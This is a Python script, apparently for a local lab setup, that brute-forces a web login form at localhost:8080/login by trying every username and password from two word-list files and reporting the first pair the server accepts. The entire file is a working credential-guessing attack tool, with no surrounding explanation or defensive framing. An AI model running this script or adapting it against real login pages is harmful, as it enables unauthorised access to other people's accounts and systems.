import requests
import sys
import time

# تمرير عبر nginx على المنفذ 8080 (same-origin)
URL = "http://localhost:8080/login"

def load_lines(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        print(f"Failed to read {path}: {e}")
        return []

usernames = load_lines("usernames.txt")
passwords = load_lines("passwords.txt")

if not usernames or not passwords:
    print("usernames.txt or passwords.txt missing or empty.")
    sys.exit(1)

try:
    for user in usernames:
        for pwd in passwords:
            payload = {"username": user, "password": pwd}
            try:
                r = requests.post(URL, json=payload, timeout=6)
                status = r.status_code
                try:
                    body = r.json()
                except Exception:
                    body = r.text
                print(f"Trying {user}:{pwd} -> {status}, {body}")
                # stop if login succeeded (backend returns success true)
                if isinstance(body, dict) and body.get("success") is True:
                    print(f"[SUCCESS] Credentials found: {user}:{pwd}")
                    raise SystemExit(0)
                # slight delay to avoid flooding
                time.sleep(0.12)
            except requests.exceptions.RequestException as e:
                print(f"Network error for {user}:{pwd} -> {e}")
            except Exception as e:
                print(f"Error for {user}:{pwd} -> {e}")
except KeyboardInterrupt:
    print("\nInterrupted by user.")
    sys.exit(1)
